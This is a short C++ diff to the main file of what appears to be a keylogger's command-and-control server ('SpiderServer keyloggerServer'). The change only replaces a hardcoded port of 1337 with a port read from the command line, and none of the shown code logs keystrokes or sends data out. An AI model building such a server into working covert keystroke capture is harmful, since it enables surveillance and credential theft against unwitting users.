@@ -1,5 +1,6 @@
 #include <thread>
 #include <csignal>
+#include <cstdlib>
 #include "CommandCenter.h"
 #include "SpiderServer.h"
 #include "WebServer.h"
@@ -13,9 +14,18 @@ static void sigintHandler(int)
   running = false;
 }
 
-int main()
+int main(int ac, char **av)
 {
   int ret = EXIT_SUCCESS;
+
+  if (ac != 2)
+    {
+      std::cout << "Usage: " << *av << " port" << std::endl;
+      return EXIT_FAILURE;
+    }
+
+  std::uint16_t port =
+      static_cast<std::uint16_t>(std::strtol(*(av + 1), nullptr, 10));
 
   try
     {
@@ -42,7 +52,7 @@ int main()
 
       // Create keylogger server
       nope::log::Log(Info) << "Creating server...";
-      spider::server::SpiderServer keyloggerServer(cmdCenter, running, 1337);
+      spider::server::SpiderServer keyloggerServer(cmdCenter, running, port);
 
       // Create controllers here
       spider::http::WebServer httpServer(cmdCenter, running, 8080,
